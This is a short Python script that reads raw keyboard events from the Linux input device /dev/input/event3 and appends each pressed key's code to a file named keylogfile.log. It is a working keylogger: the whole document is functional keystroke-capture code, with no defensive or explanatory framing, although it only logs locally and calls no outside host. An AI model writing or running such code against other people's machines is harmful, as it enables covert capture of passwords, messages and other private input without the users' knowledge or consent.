#!/usr/bin/python
import struct

infile_path = "/dev/input/event3"

"""
FORMAT represents the format used by linux kernel input event struct
See https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28
Stands for: long int, long int, unsigned short, unsigned short, unsigned int
"""
FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)
in_file = open(infile_path, "rb")

event = in_file.read(EVENT_SIZE)

while event:
    (_, _, etype, code, value) = struct.unpack(FORMAT, event)

    if etype == 1 and value == 1:
        with open('keylogfile.log', 'a+') as logfile:
            logfile.write(f"{code}, ")

    event = in_file.read(EVENT_SIZE)

in_file.close()
